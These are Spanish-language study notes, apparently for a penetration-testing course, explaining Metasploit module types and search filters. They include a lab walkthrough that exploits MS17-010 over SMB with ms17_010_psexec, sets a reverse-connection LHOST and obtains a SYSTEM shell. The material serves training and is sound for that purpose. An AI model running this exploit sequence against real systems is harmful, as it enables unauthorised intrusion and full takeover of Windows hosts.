
## 1. ¿Qué son los módulos?

Los módulos de Metasploit son scripts preparados para realizar tareas específicas, con funcionalidades desarrolladas y probadas previamente.

Los módulos `exploit` permiten aprovechar vulnerabilidades conocidas para intentar ejecutar un payload en el sistema objetivo.

**Importante:** si un exploit falla, no significa necesariamente que la vulnerabilidad no exista. Puede necesitar ajustes según el sistema objetivo. Metasploit es una herramienta de apoyo, no un sustituto de la enumeración y las pruebas manuales.

---

## 2. Estructura de los módulos

Los módulos se organizan siguiendo esta estructura:

```
<No.> <type>/<os>/<service>/<name>
```

Ejemplo:

```
794 exploit/windows/ftp/scriptftp_list
```

|Campo|Descripción|
|---|---|
|`No.`|Índice del módulo en los resultados de búsqueda. Permite seleccionarlo por número.|
|`Type`|Tipo de módulo y funcionalidad que proporciona.|
|`OS`|Sistema operativo o plataforma para la que está diseñado.|
|`Service`|Servicio objetivo o actividad relacionada con el módulo.|
|`Name`|Nombre que describe la función específica del módulo.|

### Tipos de módulos

|Tipo|Función|
|---|---|
|`Auxiliary`|Escaneo, fuzzing, sniffing y administración.|
|`Encoders`|Codificación de payloads para ayudar a que lleguen intactos al destino.|
|`Exploits`|Aprovechan vulnerabilidades para permitir la ejecución o entrega de un payload.|
|`NOPs`|Código de no operación utilizado para mantener tamaños de payload consistentes en determinados exploits.|
|`Payloads`|Código que se ejecuta en el objetivo y puede establecer una conexión con el atacante.|
|`Plugins`|Scripts adicionales que amplían las funcionalidades de Metasploit.|
|`Post`|Recopilación de información y otras acciones posteriores al acceso inicial, incluido el pivotaje.|

Los módulos que se pueden seleccionar como iniciadores de una interacción mediante `use` incluyen `Auxiliary`, `Exploit` y `Post`.

## 3. Búsqueda de módulos

Metasploit permite localizar módulos mediante palabras clave y filtros.

```
msf6 > help search
```

### Buscar por nombre

```
msf6 > search eternalromance
```

### Buscar exclusivamente exploits

```
msf6 > search eternalromance type:exploit
```

### Buscar por CVE, plataforma, tipo y fiabilidad

```
msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft
```

Este último ejemplo busca módulos que coincidan con todos los criterios especificados.

### Filtros importantes

|Filtro|Función|
|---|---|
|`type:`|Filtra por tipo de módulo.|
|`platform:`|Filtra por plataforma.|
|`arch:`|Filtra por arquitectura.|
|`cve:`|Busca por identificador CVE.|
|`edb:`|Busca por identificador de Exploit-DB.|
|`port:`|Filtra por puerto.|
|`rank:`|Filtra por nivel de fiabilidad del exploit.|
|`name:`|Busca por nombre descriptivo.|
|`description:`|Busca por descripción.|
|`author:`|Filtra por autor.|
|`check:`|Filtra según si el módulo admite la comprobación de vulnerabilidad.|
|`date:`|Filtra por fecha de divulgación.|

También podemos excluir resultados anteponiendo `-` al valor del filtro.

Ejemplo:

```
msf6 > search cve:2009 type:exploit platform:-linux
```

### Ordenar los resultados

```
msf6 > search cve:2009 -s name
```

Ordena por nombre.

```
msf6 > search type:exploit -s type -r
```

Ordena por tipo en orden inverso.

Las opciones `-s` y `-r` permiten ordenar los resultados y cambiar el sentido del orden.

## 4. Selección de un módulo

Antes de seleccionar un exploit, debemos enumerar el objetivo e identificar los servicios y sus versiones.

En el ejemplo del módulo, se realiza un escaneo con Nmap:

```
nmap -sV 10.10.10.40
```

El resultado muestra, entre otros servicios:

```
445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds
```

El puerto `445/tcp` corresponde al servicio SMB.

Después de identificar el servicio, buscamos módulos relacionados con MS17-010:

```
msf6 > search ms17_010
```

Entre los resultados aparecen:

```
exploit/windows/smb/ms17_010_eternalblue
exploit/windows/smb/ms17_010_psexec
auxiliary/admin/smb/ms17_010_command
auxiliary/scanner/smb/smb_ms17_010
```

Estos módulos tienen finalidades diferentes:

- `ms17_010_eternalblue`: exploit relacionado con EternalBlue.
    
- `ms17_010_psexec`: exploit relacionado con EternalRomance, EternalSynergy y EternalChampion.
    
- `ms17_010_command`: módulo auxiliar para ejecutar comandos.
    
- `smb_ms17_010`: módulo auxiliar para detectar la vulnerabilidad.
    

**Importante:** EternalBlue y EternalRomance son técnicas diferentes, aunque ambas están relacionadas con la familia de vulnerabilidades MS17-010. Debemos seleccionar el módulo que corresponda al escenario identificado.

## 5. Seleccionar e inspeccionar un módulo

Podemos seleccionar un módulo utilizando su índice en los resultados:

```
msf6 > use 0
```

También podemos indicar su ruta completa:

```
msf6 > use exploit/windows/smb/ms17_010_psexec
```

El índice depende de los resultados de búsqueda actuales. No debemos asumir que un número concreto siempre corresponde al mismo módulo.

### Mostrar las opciones

```
msf6 exploit(windows/smb/ms17_010_psexec) > show options
```

Este comando muestra las opciones del módulo y del payload.

La columna `Required` indica si una opción es obligatoria.

### Consultar la información del módulo

```
msf6 exploit(windows/smb/ms17_010_psexec) > info
```

Permite consultar información como:

- Nombre y ruta del módulo.
    
- Plataforma y arquitectura.
    
- Nivel de fiabilidad (`Rank`).
    
- Fecha de divulgación.
    
- Objetivos disponibles.
    
- Opciones necesarias.
    
- Información sobre el payload.
    
- Descripción y referencias.

## 6. Opciones importantes

En el módulo del ejemplo aparecen las siguientes opciones:

|Opción|Descripción|
|---|---|
|`RHOSTS`|Dirección IP o direcciones de los objetivos.|
|`RPORT`|Puerto del servicio remoto.|
|`LHOST`|Dirección local a la que debe conectarse el payload inverso.|
|`LPORT`|Puerto local utilizado para la conexión inversa.|
|`SMBUser`|Usuario para la autenticación SMB.|
|`SMBPass`|Contraseña para la autenticación SMB.|
|`SMBDomain`|Dominio utilizado para la autenticación SMB.|
|`SHARE`|Recurso compartido SMB utilizado por el módulo.|

En el ejemplo, el puerto remoto SMB es `445` y el puerto local del payload es `4444`.

### Establecer el objetivo

```
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
```

### Establecer una opción global

```
msf6 exploit(windows/smb/ms17_010_psexec) > setg RHOSTS 10.10.10.40
```

La diferencia es importante:

- `set`: configura una opción para el módulo actual.
    
- `setg`: establece una opción global que puede reutilizarse en otros módulos durante la sesión de Metasploit.
    

Las opciones globales permanecen disponibles hasta que se cambien o termine la sesión de Metasploit.

### Configurar la dirección de la conexión inversa

```
msf6 exploit(windows/smb/ms17_010_psexec) > setg LHOST 10.10.14.15
```

`LHOST` debe corresponder a una dirección local accesible desde el objetivo para establecer la conexión inversa. No debe elegirse automáticamente la IP de una interfaz cualquiera: hay que comprobar qué interfaz y dirección corresponden al escenario de red.

### Verificar la configuración

```
msf6 exploit(windows/smb/ms17_010_psexec) > show options
```

Antes de ejecutar el módulo, debemos comprobar que las opciones obligatorias estén configuradas correctamente.

## 7. Ejecutar el módulo

Una vez revisadas las opciones, podemos iniciar el módulo:

```
msf6 exploit(windows/smb/ms17_010_psexec) > run
```

También existe el comando `exploit` para ejecutar módulos de explotación.

En el ejemplo del laboratorio, Metasploit comprueba la vulnerabilidad MS17-010 y, si el exploit tiene éxito, establece una conexión inversa.

Una salida posible es:

```
[*] Started reverse TCP handler on 10.10.14.15:4444
[+] 10.10.10.40:445 - Host is likely VULNERABLE to MS17-010!
[*] Command shell session 1 opened
```

Los mensajes indican que se ha iniciado el manejador de conexiones, que el objetivo parece vulnerable y que se ha abierto una sesión.

**Importante:** que una comprobación indique que un objetivo probablemente es vulnerable no garantiza que la explotación vaya a funcionar. El resultado depende del sistema, su configuración y las condiciones del exploit.

---

## 8. Interactuar con la sesión

En el ejemplo, Metasploit abre una sesión de shell en el sistema Windows objetivo.

Desde una sesión de Meterpreter, el comando siguiente permite abrir una shell del sistema:

```
meterpreter > shell
```

Después podemos ejecutar comandos de Windows, como:

```
whoami
```

En el escenario del material, la respuesta es:

```
nt authority\system
```

Esto indica que la shell se está ejecutando con la identidad `NT AUTHORITY\SYSTEM`, una cuenta de sistema con privilegios muy elevados en Windows.

No todos los exploits proporcionan este nivel de acceso: los privilegios dependen de la vulnerabilidad explotada y del contexto en el que se ejecuta el payload.

## 9. Flujo de trabajo resumido

```
1. Enumerar el objetivo con Nmap.
2. Identificar los servicios, puertos y versiones.
3. Buscar módulos con search.
4. Seleccionar el módulo con use.
5. Consultar sus detalles con info.
6. Revisar las opciones con show options.
7. Configurar las opciones obligatorias con set o setg.
8. Verificar la configuración.
9. Ejecutar el módulo con run o exploit.
10. Comprobar si se ha abierto una sesión.
11. Interactuar con la sesión y verificar los privilegios.
```

## 10. Comandos que debes recordar

|Comando|Función|
|---|---|
|`help search`|Consultar la ayuda de búsqueda.|
|`search <término>`|Buscar módulos.|
|`search type:exploit platform:windows`|Filtrar exploits para Windows.|
|`use <índice>`|Seleccionar un módulo mediante su índice actual.|
|`use <ruta>`|Seleccionar un módulo mediante su ruta completa.|
|`show options`|Mostrar las opciones del módulo.|
|`info`|Consultar información detallada del módulo.|
|`set <opción> <valor>`|Configurar una opción del módulo actual.|
|`setg <opción> <valor>`|Configurar una opción global.|
|`run`|Ejecutar el módulo.|
|`exploit`|Ejecutar un módulo de explotación.|
|`sessions`|Consultar las sesiones disponibles.|
|`shell`|Desde Meterpreter, abrir una shell del sistema.|

## 11. Ideas clave para el examen

- Los módulos de Metasploit están organizados por tipo, plataforma, servicio y nombre.
    
- `Auxiliary`, `Exploit` y `Post` son tipos de módulos interactivos que pueden seleccionarse con `use`.
    
- `search` admite filtros como `type:`, `platform:`, `cve:`, `port:` y `rank:`.
    
- El índice de un módulo permite seleccionarlo rápidamente, pero depende de los resultados de búsqueda actuales.
    
- `show options` permite identificar las opciones obligatorias mediante la columna `Required`.
    
- `info` proporciona detalles del módulo, sus objetivos, opciones y referencias.
    
- `RHOSTS` identifica el objetivo remoto; `RPORT`, el puerto remoto.
    
- `LHOST` y `LPORT` configuran los parámetros locales de la conexión inversa.
    
- `set` configura opciones del módulo actual; `setg` establece opciones globales.
    
- Un exploit que falla no demuestra que la vulnerabilidad no exista.
    
- Una sesión abierta no implica necesariamente privilegios de administrador o `SYSTEM`: hay que verificar la identidad con `whoami`.
    
- Metasploit facilita la explotación, pero no sustituye la enumeración ni la validación manual.
